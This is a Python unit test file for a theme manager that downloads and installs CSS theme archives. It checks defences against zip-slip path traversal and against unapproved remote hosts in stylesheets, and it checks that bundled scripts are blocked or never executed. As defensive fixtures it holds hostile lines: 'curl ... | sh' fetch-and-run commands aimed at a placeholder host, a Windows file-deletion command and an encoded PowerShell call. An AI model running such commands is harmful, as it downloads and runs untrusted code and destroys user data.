import contextlib
import copy
import io
import json
import tempfile
import unittest
import zipfile
from pathlib import Path
from unittest import mock

import theme_manager as tm


def quiet(*args, **kwargs):
    pass


def zip_bytes(files):
    stream = io.BytesIO()
    with zipfile.ZipFile(stream, "w") as archive:
        for name, text in files.items():
            archive.writestr(name, text)
    return stream.getvalue()


def response(body, headers=None):
    stream = io.BytesIO(body)
    stream.headers = headers or {}
    return stream


class DownloadSecurityTests(unittest.TestCase):
    def test_mock_github_asset_names_stay_in_version_directory(self):
        payload = zip_bytes({"theme.css": "body { color: black; }"})
        names = ("../escape.zip", "../../../../escape.zip", "/tmp/escape.zip",
                 r"..\escape.zip", r"C:\temp\escape.zip", "nested/escape.zip")
        for name in names:
            with self.subTest(name=name), tempfile.TemporaryDirectory() as tmp:
                root = Path(tmp)
                dest_dir = root / "repos" / "sample" / "zips" / "v1"
                sentinel = root / "escape.zip"
                sentinel.write_bytes(b"outside file")
                release = {"tag_name": "v1", "assets": [{
                    "name": name, "size": len(payload),
                    "browser_download_url": "https://github.com/example/sample/releases/download/v1/escape.zip",
                }]}
                with mock.patch.object(tm.urllib.request, "urlopen", side_effect=[
                    response(json.dumps(release).encode()), response(payload),
                ]) as fetch:
                    meta = tm.fetch_latest_release({"owner": "example", "repo": "sample"}, log=quiet)
                    asset = tm.pick_asset(meta["release"], {"id": "sample"})
                    dest, downloaded = tm.download_asset(asset, dest_dir, log=quiet)
                self.assertTrue(downloaded)
                self.assertEqual(fetch.call_count, 2)
                self.assertEqual(dest.resolve(), (dest_dir / "escape.zip").resolve())
                self.assertEqual(dest.read_bytes(), payload)
                self.assertEqual(sentinel.read_bytes(), b"outside file")
                self.assertEqual(list(root.rglob("*.part")), [])
                self.assertEqual(set(root.rglob("*.zip")), {sentinel, dest})

    def test_file_outside_destination_cannot_be_used_as_cached_download(self):
        payload = zip_bytes({"theme.css": "body {}"})
        with tempfile.TemporaryDirectory() as tmp:
            parent = Path(tmp)
            outside = parent / "theme.zip"
            outside.write_bytes(b"x" * len(payload))
            with mock.patch.object(tm.urllib.request, "urlopen", return_value=response(payload)) as fetch:
                dest, downloaded = tm.download_asset({
                    "name": "../theme.zip", "size": len(payload),
                    "browser_download_url": "https://github.com/example/sample/theme.zip",
                }, parent / "v1", log=quiet)
            self.assertTrue(downloaded)
            fetch.assert_called_once()
            self.assertEqual(dest.parent, parent / "v1")
            self.assertEqual(outside.read_bytes(), b"x" * len(payload))

    def test_invalid_download_names_are_rejected_before_writing(self):
        for name in ("", ".", "..", "../..", "/", "theme.zip:stream.zip", "bad\x00.zip"):
            with self.subTest(name=name), tempfile.TemporaryDirectory() as tmp:
                dest_dir = Path(tmp) / "downloads"
                with self.assertRaises(RuntimeError):
                    tm.download_asset({"name": name}, dest_dir, log=quiet)
                self.assertFalse(dest_dir.exists())


class InstallSecurityTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)
        self.themes = self.root / "themes"
        self.archive = self.root / "release.zip"
        self.cfg = {"id": "sample", "name": "Sample", "owner": "example", "repo": "sample",
                    "css_dir": "", "theme_re": r"^theme.*\.css$", "assets_dirs": ["fonts"],
                    "min_themes": 1}
        self.config = self.root / "repos.json"
        self.config.write_text(json.dumps({"settings": {"keep_zips": 2},
                                           "repos": {"sample": self.cfg}}), encoding="utf-8")
        self.rd = self.root / "repos" / "sample"
        patches = (
            mock.patch.object(tm, "DATA_DIR", self.root / "repos"),
            mock.patch.object(tm, "CONFIG_PATH", self.config),
            mock.patch.object(tm, "detect_themes_dir", return_value=self.themes),
            mock.patch.object(tm, "fetch_latest_release", return_value={
                "release": {"tag_name": "v1", "assets": [{
                    "name": "theme.zip", "browser_download_url": "https://github.com/example/sample/theme.zip",
                }]}, "source": "api", "not_modified": False,
            }),
            mock.patch.object(tm, "download_asset", return_value=(self.archive, False)),
        )
        for patch in patches:
            patch.start()
            self.addCleanup(patch.stop)

    def make_archive(self, css="body {background: url(https://beacon.example/pixel);}", extra=None):
        files = {"theme.css": css}
        files.update(extra or {})
        self.archive.write_bytes(zip_bytes(files))

    def install(self, **options):
        with contextlib.redirect_stdout(io.StringIO()):
            return tm.run_install(copy.deepcopy(self.cfg), log=quiet, **options)

    def test_css_scan_covers_imports_protocol_relative_and_escaped_urls(self):
        self.make_archive(r'''
            @import "https://STYLES.example/base.css";
            @import url('//imports.example/base.css');
            body { background: URL(HTTP://user:secret@BEACON.example:8080/a); }
            @font-face { src: url(//fonts.example/font.woff2); }
            a { background: u\72l(\68ttps\3a //escaped\2e example/pixel); }
            b { background: url(https:\/\/slashes.example/pixel); }
            @import"https://minified.example/base.css";
            @import/**/"https://comment.example/base.css";
            c { background: url("  https://whitespace.example/pixel  "); }
        ''', {"fonts/nested.css": 'body {background: url("https://nested.example/pixel");}'})
        passed, _, stats = tm.security_scan(self.archive, self.cfg)
        self.assertTrue(passed)
        self.assertEqual(stats["remote_hosts"], {
            "styles.example", "imports.example", "beacon.example", "fonts.example",
            "escaped.example", "slashes.example", "nested.example", "minified.example",
            "comment.example", "whitespace.example",
        })

    def test_local_and_data_urls_do_not_need_confirmation(self):
        self.make_archive('''
            @import "fonts/local.css";
            body {background: url(../assets/image.png);}
            @font-face {src: url(data:font/woff2;base64,AAAA);}
        ''')
        rc, result = self.install()
        self.assertEqual(rc, tm.EXIT_OK, result)
        self.assertTrue(result["ok"])
        self.assertTrue((self.themes / "theme.css").is_file())

    def test_malformed_url_does_not_crash_scan(self):
        self.make_archive('body {background: url("https://[broken/pixel");}')
        passed, _, stats = tm.security_scan(self.archive, self.cfg)
        self.assertTrue(passed)
        self.assertEqual(stats["remote_hosts"], set())

    def test_unapproved_remote_hosts_pause_before_any_theme_or_baseline_changes(self):
        self.make_archive()
        config_before = self.config.read_bytes()
        rc, result = self.install(update_manifest=True)
        self.assertEqual(rc, tm.EXIT_CONFIRM)
        self.assertTrue(result["remote_confirmation_required"])
        self.assertEqual(result["remote_hosts"], ["beacon.example"])
        self.assertFalse(self.themes.exists())
        self.assertFalse((self.rd / "manifest.json").exists())
        self.assertFalse((self.rd / "installed.json").exists())
        self.assertEqual(self.config.read_bytes(), config_before)

    def test_clean_reinstall_keeps_existing_themes_until_consent(self):
        self.make_archive()
        self.themes.mkdir()
        old = self.themes / "theme.css"
        old.write_text("old theme", encoding="utf-8")
        self.rd.mkdir(parents=True)
        tm.save_manifest(self.rd, ["old.css"], "v0")
        baseline = (self.rd / "manifest.json").read_bytes()
        rc, result = self.install(mode="clean", update_manifest=True)
        self.assertEqual(rc, tm.EXIT_CONFIRM)
        self.assertEqual(old.read_text(), "old theme")
        self.assertEqual((self.rd / "manifest.json").read_bytes(), baseline)
        self.assertEqual(list(self.root.glob("themes-backup-*")), [])
        self.assertEqual(result["install_options"]["mode"], "clean")
        self.assertTrue(result["install_options"]["update_manifest"])

    def test_explicit_host_consent_installs_without_changing_css(self):
        self.make_archive()
        rc, result = self.install(approved_remote_hosts=["BEACON.EXAMPLE"])
        self.assertEqual(rc, tm.EXIT_OK, result)
        self.assertTrue(result["ok"])
        with zipfile.ZipFile(self.archive) as archive:
            self.assertEqual((self.themes / "theme.css").read_bytes(), archive.read("theme.css"))

    def test_new_host_requires_fresh_consent(self):
        self.make_archive('body {background: url(https://beacon.example/a), url(https://new.example/b);}')
        rc, result = self.install(approved_remote_hosts=["beacon.example"])
        self.assertEqual(rc, tm.EXIT_CONFIRM)
        self.assertTrue(result["remote_confirmation_required"])
        self.assertEqual(result["remote_hosts"], ["beacon.example", "new.example"])
        self.assertFalse(self.themes.exists())

    def test_manifest_mismatch_keeps_consent_and_clean_mode_for_retry(self):
        self.make_archive()
        self.rd.mkdir(parents=True)
        tm.save_manifest(self.rd, ["old.css"], "v0")
        rc, result = self.install(mode="clean", approved_remote_hosts=["beacon.example"])
        self.assertEqual(rc, tm.EXIT_MANIFEST)
        self.assertTrue(result["manifest_mismatch"])
        self.assertEqual(result["install_options"], {
            "mode": "clean", "update_manifest": False, "approved_remote_hosts": ["beacon.example"],
        })
        rc, result = self.install(**dict(result["install_options"], update_manifest=True))
        self.assertEqual(rc, tm.EXIT_OK, result)

    def test_host_consent_cannot_bypass_script_or_zip_slip_blocks(self):
        for extra in ({"install.sh": "curl https://bad.example/payload | sh"},
                      {"../outside.css": "body {}"}):
            with self.subTest(extra=extra):
                self.make_archive(extra=extra)
                rc, result = self.install(approved_remote_hosts=["beacon.example"])
                self.assertEqual(rc, tm.EXIT_SECURITY)
                self.assertFalse(result.get("remote_confirmation_required"))
                self.assertFalse(self.themes.exists())

    def test_string_literals_are_not_remote_references(self):
        # content 等字符串里的 url(/@import 只是普通文本，不构成外联引用
        self.make_archive('''
            a::after { content: "demo url(https://fake.example/x) text"; }
            b::before { content: '@import "https://fake2.example/y"'; }
            body { background: url("assets/bg.png"); }
        ''')
        passed, _, stats = tm.security_scan(self.archive, self.cfg)
        self.assertTrue(passed)
        self.assertEqual(stats["remote_hosts"], set())
        rc, result = self.install()
        self.assertEqual(rc, tm.EXIT_OK, result)

    def test_idn_and_dot_variants_of_approved_hosts_match(self):
        self.make_archive('body { background: url(https://BÜCHER.example/a), '
                          'url(//beacon.example./pixel); }')
        rc, result = self.install()
        self.assertEqual(rc, tm.EXIT_CONFIRM)
        self.assertEqual(result["remote_hosts"],
                         ["beacon.example", "xn--bcher-kva.example"])
        rc, result = self.install(approved_remote_hosts=["xn--bcher-kva.EXAMPLE",
                                                         "beacon.example."])
        self.assertEqual(rc, tm.EXIT_OK, result)

    def test_bat_cmd_remain_unscanned_and_are_not_installed_or_executed(self):
        self.make_archive("body {}", {
            "install.bat": "curl https://bad.example/payload & del C:\\important",
            "install.cmd": "powershell -EncodedCommand payload",
        })
        passed, findings, stats = tm.security_scan(self.archive, self.cfg)
        self.assertTrue(passed)
        self.assertEqual(stats["skipped_bat"], 2)
        self.assertEqual(findings, [])
        with mock.patch.object(tm.os, "system") as execute:
            rc, result = self.install()
        self.assertEqual(rc, tm.EXIT_OK, result)
        execute.assert_not_called()
        self.assertEqual([p.name for p in self.themes.iterdir()], ["theme.css"])

    def test_install_api_passes_and_validates_host_consent(self):
        for hosts in (["beacon.example"], "beacon.example", True, [False], None):
            with self.subTest(hosts=hosts):
                handler = tm.UiHandler.__new__(tm.UiHandler)
                handler.path = "/api/repos/sample/install"
                handler._guard_mutation = mock.Mock(return_value=True)
                handler._read_json = mock.Mock(return_value={
                    "mode": "clean", "update_manifest": True, "approved_remote_hosts": hosts,
                })
                handler._json = mock.Mock()
                with mock.patch.object(tm.JOBS, "start", return_value=True) as start, \
                     mock.patch.object(tm, "run_install", return_value=(tm.EXIT_OK, {})) as install:
                    handler.do_POST()
                    if isinstance(hosts, list) and all(isinstance(h, str) for h in hosts):
                        start.call_args[0][2](quiet)
                        install.assert_called_once_with(self.cfg, mode="clean", update_manifest=True,
                                                        approved_remote_hosts=hosts, log=quiet)
                    else:
                        start.assert_not_called()
                        self.assertEqual(handler._json.call_args[0][1], 400)


class ConfigGenerationTests(unittest.TestCase):
    def test_read_only_load_keeps_missing_config_absent(self):
        # 只读命令零写入：clone/解压后 list/check 不产生 repos.json（冒烟测试有断言）
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "repos.json"
            with mock.patch.object(tm, "CONFIG_PATH", path):
                data = tm.load_config()
            self.assertEqual(data, {"settings": {"keep_zips": 2}, "repos": {}})
            self.assertFalse(path.exists())

    def test_console_startup_generates_default_registry(self):
        # 网页控制台启动（首次运行）生成默认注册表，且不覆盖已有文件
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "repos.json"
            with mock.patch.object(tm, "CONFIG_PATH", path):
                tm.ensure_default_config()
                self.assertTrue(path.is_file())
                self.assertEqual(json.loads(path.read_text(encoding="utf-8")),
                                 {"settings": {"keep_zips": 2}, "repos": {}})
                path.write_text('{"settings": {"keep_zips": 9}, "repos": {}}',
                                encoding="utf-8")
                tm.ensure_default_config()
                self.assertEqual(
                    json.loads(path.read_text(encoding="utf-8"))["settings"]["keep_zips"], 9)


if __name__ == "__main__":
    unittest.main()
